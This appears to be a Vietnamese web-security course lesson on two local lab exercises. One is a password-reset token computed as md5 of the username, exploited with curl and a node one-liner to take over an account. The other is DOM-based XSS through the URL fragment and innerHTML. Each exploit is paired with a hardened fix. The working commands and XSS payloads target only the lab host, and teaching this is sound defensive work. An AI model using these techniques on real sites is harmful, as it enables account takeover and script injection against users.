# Bài 16 · Reset Token đoán được + DOM XSS — LAB-19, 20

**Mục tiêu:** hai lỗ hổng "mật mã sai cách dùng" và "XSS vô hình với server"
— cặp kết thúc khoá học web của lab.

## 1. Predictable reset token — LAB-19 (account takeover)

Quy trình reset mật khẩu chuẩn: request → hệ thống sinh token NGẪU NHIÊN dài
→ gửi qua kênh ngoài (email) → chủ account dùng token đổi pass. Bản vuln phá
cả 3 điều kiện: token **dự đoán được** + **trả thẳng trong response** +
**không hết hạn/dùng lại được**.

```bash
curl -s "http://127.0.0.1:3000/api/reset/request?user=carol"
# → token = md5("carol")[0:12] — hàm hash của DỮ LIỆU CÔNG KHAI!

# Tự tính token của bất kỳ user nào — không cần đọc email:
node -e "console.log(require('crypto').createHash('md5').update('dave').digest('hex').slice(0,12))"
# → dùng token đó đổi mật khẩu của dave:
curl -s -X POST http://127.0.0.1:3000/api/reset/confirm \
  -d "user=dave&token=<TOKEN>&newpass=pwned99"
curl -s -X POST http://127.0.0.1:3000/api/token -d "username=dave&password=pwned99"
# → JWT hợp lệ của dave — chiếm account hoàn toàn, không cần tương tác nạn nhân
```

Tại sao md5(username) "tệ" dù md5 không ngược được? Vì không gian đầu vào là
**công khai và nhỏ** — ai cũng tự băm được. Token reset cần *entropy*, không
phải tính bí mật.

Đối chứng hardened: `crypto.randomBytes(16)` = 128-bit random, lưu server
kèm TTL 10 phút, **xoá sau khi dùng** (one-time), response request không trả
token (demo in ra `demo_token` chỉ để bạn kiểm chứng — app thật sẽ gửi email).
Sai token → 403; token đúng → 200 rồi token bay màu.

## 2. DOM-based XSS — LAB-20 (payload không lên server)

Mở `http://127.0.0.1:3000/dom#<img src=x onerror=alert(document.domain)>` trong
trình duyệt → alert chạy. Nhưng xem `/_lab/log`: **không có request nào chứa
payload** — fragment `#...` theo spec HTTP không bao giờ gửi lên server.

Chuỗi tấn công hoàn toàn phía client:

```js
location.hash            // source — kẻ tấn công kiểm soát qua URL
  ↓ slice(1) + decodeURIComponent
document.getElementById('out').innerHTML = ...   // sink — markup bị parse
```

Tại sao quan trọng: WAF/IDS/server-log **không nhìn thấy gì** — mọi dấu vết
nằm ở trình duyệt. Đây là lý do DOM XSS cần *source-sink analysis* phía
client và CSP, không chỉ lọc input server-side.

Đối chứng hardened: cùng một trang `/dom` nhưng dùng `textContent` — hash
được hiển thị như *văn bản thuần*, browser không parse markup. So sánh
source hai bản (`view-source:` hoặc curl) để thấy vá bằng đúng 1 dòng.

## Tiêu chí hoàn thành

- [ ] Chiếm account `dave` bằng token tự tính (không gọi /api/reset/request).
- [ ] Giải thích: nếu token là `sha256(username)` thì có an toàn hơn không?
      (Không — vẫn deterministic từ dữ liệu công khai.)
- [ ] Mở `/dom#<svg onload=...>` trên cả 2 bản trong trình duyệt, chụp lại
      khác biệt; giải thích vì sao `detect`/log không thấy payload.
- [ ] Nêu 2 sink JS nguy hiểm khác ngoài `innerHTML` (eval, document.write,
      location.href gán markup…).
